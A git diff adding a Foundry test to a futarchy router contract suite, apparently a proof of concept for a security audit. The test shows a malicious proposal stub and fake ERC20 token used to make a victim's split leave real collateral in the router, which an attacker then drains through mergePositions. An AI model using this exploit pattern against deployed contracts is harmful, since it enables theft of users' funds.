@@ -9,6 +9,10 @@ import {IMarketFactory, MarketView} from "../src/MarketView.sol";
 import "forge-std/Test.sol";
 import "solmate/src/utils/LibString.sol";
 
+import "./utils/MaliciousProposal.sol";
+
+import "./utils/FakeERC20.sol";
+
 contract FutarchyFactoryTest is Test {
     uint256 constant MAX_SPLIT_AMOUNT = 100_000_000 ether;
 
@@ -144,6 +148,44 @@ contract FutarchyFactoryTest is Test {
 
         futarchyRouter.redeemProposal(proposal, amountSplit1 > 0 ? halfAmount1 : 0, amountSplit2 > 0 ? halfAmount2 : 0);
     }
+
+    function test_MaliciousProposalStealsCollateral() public {
+        // 1) Setup a real market
+        FutarchyProposal realProposal = getProposal(MIN_BOND);
+
+        // 2) Deploy fake wrapper & malicious stub
+        FakeERC20 fake = new FakeERC20();
+        MaliciousProposal stub = new MaliciousProposal(realProposal, fake);
+
+        // 3) Fund router with fake tokens so split will succeed
+        uint256 amt = 1 ether;
+        fake.mint(address(futarchyRouter), amt*2);
+
+        // 4) Victim splits using the malicious stub
+        address victim = address(0xCAFE);
+        deal(address(collateralToken1), victim, amt);
+        vm.startPrank(victim);
+        collateralToken1.approve(address(futarchyRouter), amt);
+        futarchyRouter.splitPosition(FutarchyProposal(address(stub)), collateralToken1, amt);
+        vm.stopPrank();
+
+        // Router now holds real wrappers: verify
+        (IERC20 realWrapper, ) = realProposal.wrappedOutcome(0);
+        assertEq(realWrapper.balanceOf(address(futarchyRouter)), amt);
+
+        // 5) Attacker merges to drain collateral
+        address attacker = address(this);
+        vm.startPrank(attacker);
+        fake.mint(attacker, amt*2);
+        fake.approve(address(futarchyRouter), amt*2);
+        futarchyRouter.mergePositions(FutarchyProposal(address(stub)), collateralToken1, amt);
+        vm.stopPrank();
+
+        // Attacker ends up with the real collateral
+        assertEq(collateralToken1.balanceOf(attacker), amt);
+        assertEq(collateralToken1.balanceOf(victim), 0);
+    }
+    
 
     function approveWrappedTokens(
         address spender,
